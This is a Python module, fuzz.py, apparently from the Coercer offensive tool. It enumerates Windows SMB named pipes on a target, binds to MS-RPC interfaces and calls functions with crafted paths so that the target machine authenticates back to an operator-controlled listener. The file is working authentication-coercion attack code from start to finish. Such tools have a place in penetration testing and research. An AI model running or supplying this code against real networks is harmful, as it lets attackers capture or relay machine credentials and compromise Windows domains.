#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : fuzz.py
# Author             : Podalirius (@podalirius_)
# Date created       : 18 Sep 2022


import time
from coercer.core.Filter import Filter
from coercer.core.utils import generate_exploit_templates, generate_exploit_path_from_template
from coercer.network.DCERPCSession import DCERPCSession
from coercer.structures.TestResult import TestResult
from coercer.network.authentications import trigger_and_catch_authentication
from coercer.network.smb import can_connect_to_pipe, can_bind_to_interface, list_remote_pipes
from coercer.network.utils import get_ip_addr_to_listen_on, get_next_http_listener_port


def action_fuzz(target, available_methods, options, credentials, reporter):
    filter = Filter(
        filter_method_name=options.filter_method_name,
        filter_protocol_name=options.filter_protocol_name,
        filter_pipe_name=options.filter_pipe_name
    )

    http_listen_port = 0

    # Preparing pipes ==============================================================================================================

    named_pipe_of_remote_machine = []
    if credentials.is_anonymous():
        reporter.print_verbose("Cannot list SMB pipes with anonymous login, using list of known pipes")
        named_pipe_of_remote_machine = [
            r'\PIPE\atsvc',
            r'\PIPE\efsrpc',
            r'\PIPE\epmapper',
            r'\PIPE\eventlog',
            r'\PIPE\InitShutdown',
            r'\PIPE\lsass',
            r'\PIPE\lsarpc',
            r'\PIPE\LSM_API_service',
            r'\PIPE\netdfs',
            r'\PIPE\netlogon',
            r'\PIPE\ntsvcs',
            r'\PIPE\PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER',
            r'\PIPE\scerpc',
            r'\PIPE\spoolss',
            r'\PIPE\srvsvc',
            r'\PIPE\VBoxTrayIPC-Administrator',
            r'\PIPE\W32TIME_ALT',
            r'\PIPE\wkssvc'
        ]
        if options.verbose:
            print("[debug] Using integrated list of %d SMB named pipes." % len(named_pipe_of_remote_machine))
    else:
        named_pipe_of_remote_machine = list_remote_pipes(target, credentials)
        if options.verbose:
            print("[debug] Found %d SMB named pipes on the remote machine." % len(named_pipe_of_remote_machine))

    kept_pipes_after_filters = []
    for pipe in named_pipe_of_remote_machine:
        if filter.pipe_matches_filter(pipe):
            kept_pipes_after_filters.append(pipe)
    if len(kept_pipes_after_filters) == 0 and not credentials.is_anonymous():
        print("[!] No SMB named pipes matching filter --filter-pipe-name '%s' were found on the remote machine." % options.filter_pipe_name)
        return None
    elif len(kept_pipes_after_filters) == 0 and credentials.is_anonymous():
        print("[!] No SMB named pipes matching filter --filter-pipe-name '%s' were found in the list of known named pipes." % options.filter_pipe_name)
        return None
    else:
        named_pipe_of_remote_machine = kept_pipes_after_filters

    # Preparing tasks ==============================================================================================================

    tasks = {}
    for method_type in available_methods.keys():
        for category in sorted(available_methods[method_type].keys()):
            for method in sorted(available_methods[method_type][category].keys()):
                instance = available_methods[method_type][category][method]["class"]

                if filter.method_matches_filter(instance):
                    for access_type, access_methods in instance.access.items():
                        if access_type not in tasks.keys():
                            tasks[access_type] = {}

                        # Access through SMB named pipe
                        if access_type == "ncan_np":
                            for access_method in access_methods:
                                namedpipe, uuid, version = access_method["namedpipe"], access_method["uuid"], access_method["version"]
                                # if filter.pipe_matches_filter(namedpipe):
                                if uuid not in tasks[access_type].keys():
                                    tasks[access_type][uuid] = {}

                                if version not in tasks[access_type][uuid].keys():
                                    tasks[access_type][uuid][version] = []

                                if instance not in tasks[access_type][uuid][version]:
                                    tasks[access_type][uuid][version].append(instance)

    # Executing tasks =======================================================================================================================

    listening_ip = get_ip_addr_to_listen_on(target, options)
    if options.verbose:
        print("[+] Listening for authentications on '%s', SMB port %d" % (listening_ip, options.smb_port))
    exploit_paths = generate_exploit_templates()

    # Processing ncan_np tasks
    ncan_np_tasks = tasks["ncan_np"]
    for namedpipe in sorted(named_pipe_of_remote_machine):
        if can_connect_to_pipe(target, namedpipe, credentials):
            print("[+] SMB named pipe '\x1b[1;94m%s\x1b[0m' is \x1b[1;92maccessible\x1b[0m!" % namedpipe)
            for uuid in sorted(ncan_np_tasks.keys()):
                for version in sorted(ncan_np_tasks[uuid].keys()):
                    if can_bind_to_interface(target, namedpipe, credentials, uuid, version):
                        print("   [+] Successful bind to interface (%s, %s)!" % (uuid, version))

                        for msprotocol_class in sorted(ncan_np_tasks[uuid][version], key=lambda x: x.function["name"]):

                            if options.only_known_exploit_paths:
                                exploit_paths = msprotocol_class.generate_exploit_templates(desired_auth_type=options.auth_type)

                            stop_exploiting_this_function = False
                            for listener_type, exploitpath in exploit_paths:

                                if stop_exploiting_this_function:
                                    # Got a nca_s_unk_if response, this function does not listen on the given interface
                                    continue
                                if listener_type == "http":
                                    http_listen_port = get_next_http_listener_port(current_value=http_listen_port, listen_ip=listening_ip, options=options)

                                exploitpath = generate_exploit_path_from_template(
                                    template=exploitpath,
                                    listener=listening_ip,
                                    http_listen_port=http_listen_port,
                                    smb_listen_port=options.smb_port
                                )

                                msprotocol_rpc_instance = msprotocol_class(path=exploitpath)
                                dcerpc = DCERPCSession(credentials=credentials, verbose=True)
                                dcerpc.connect_ncacn_np(target=target, pipe=namedpipe)

                                if dcerpc.session is not None:
                                    dcerpc.bind(interface_uuid=uuid, interface_version=version)
                                    if dcerpc.session is not None:
                                        reporter.print_testing(msprotocol_rpc_instance)

                                        result = trigger_and_catch_authentication(
                                            options=options,
                                            dcerpc_session=dcerpc.session,
                                            target=target,
                                            method_trigger_function=msprotocol_rpc_instance.trigger,
                                            listenertype=listener_type,
                                            listen_ip=listening_ip,
                                            http_port=http_listen_port
                                        )

                                        reporter.report_test_result(
                                            uuid=uuid, version=version, namedpipe=namedpipe,
                                            msprotocol_rpc_instance=msprotocol_rpc_instance,
                                            result=result,
                                            exploitpath=exploitpath
                                        )

                                        if result == TestResult.NCA_S_UNK_IF:
                                            stop_exploiting_this_function = True

                                if options.delay is not None:
                                    # Sleep between attempts
                                    time.sleep(options.delay)
                    else:
                        if options.verbose:
                            print("   [!] Cannot bind to interface (%s, %s)!" % (uuid, version))
        else:
            if options.verbose:
                print("[!] SMB named pipe '\x1b[1;94m%s\x1b[0m' is \x1b[1;91mnot accessible\x1b[0m!" % namedpipe)

